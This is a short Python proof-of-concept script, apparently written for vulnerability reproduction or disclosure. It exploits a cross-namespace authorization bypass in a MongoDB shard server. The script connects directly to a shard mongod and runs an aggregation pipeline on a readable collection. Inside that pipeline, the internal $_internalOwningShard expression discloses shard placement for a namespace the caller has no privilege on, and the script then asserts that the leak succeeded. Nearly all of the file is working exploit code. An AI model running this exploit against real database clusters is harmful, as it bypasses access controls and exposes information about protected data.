#!/usr/bin/env python3
"""
PoC: $_internalOwningShard cross-namespace authorization bypass.
Run against a shard mongod in a sharded cluster with two independent sharded
databases: one the caller has (or would have, under --auth) read access to,
and a "secret" one they don't.

Reproduced live against the official mongodb-linux-x86_64-ubuntu2204-8.3.9 binary.
"""
import pymongo
from bson import Timestamp, ObjectId

SHARD_HOST, SHARD_PORT = "127.0.0.1", 27021  # a shard-role mongod, NOT mongos
PUBLIC_NS = ("testdb", "testcoll")           # namespace the caller legitimately reads
SECRET_NS = "secretdb.secretcoll"            # namespace the caller has no privilege on

c = pymongo.MongoClient(SHARD_HOST, SHARD_PORT, directConnection=True)
bi = c.admin.command("buildInfo")
print(f"[*] target: mongod {bi['version']} (shard role)")

sv = {"e": ObjectId("000000000000000000000000"), "t": Timestamp(0, 0), "v": Timestamp(0, 0)}

pipeline = [
    {"$limit": 1},
    {"$project": {
        "_id": 0,
        "leaked_shard_for_secret_ns": {
            "$_internalOwningShard": {
                "ns": SECRET_NS,
                "shardVersion": sv,
                "shardKeyVal": {"s": 2},
            }
        },
    }},
]

db, coll = PUBLIC_NS
print(f"[*] running aggregate against {db}.{coll} (the only namespace we 'have privilege on')")
print(f"[*] embedded $_internalOwningShard targets: {SECRET_NS}")
result = list(c[db][coll].aggregate(pipeline))
print(f"[+] result: {result}")
assert result and "leaked_shard_for_secret_ns" in result[0], "expected shard name to leak"
print("[+] confirmed: shard placement for a namespace outside the query's own scope was disclosed")
